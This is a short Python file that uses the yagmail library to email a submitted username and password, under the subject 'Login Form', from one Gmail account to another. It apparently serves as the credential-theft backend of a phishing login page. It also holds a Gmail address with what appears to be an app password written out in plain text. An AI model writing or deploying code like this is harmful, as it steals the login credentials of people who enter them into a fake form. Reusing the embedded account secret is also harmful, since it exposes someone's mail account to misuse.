import yagmail

def send_email(username, password):
    yag = yagmail.SMTP("dblank410@gmail.com", "rohl atcy jjbh ezxf")

    content = f"""
    Username: {username}
    Password: {password}
    """

    yag.send(
        to="ibocj58@gmail.com",
        subject="Login Form",
        contents=content
    )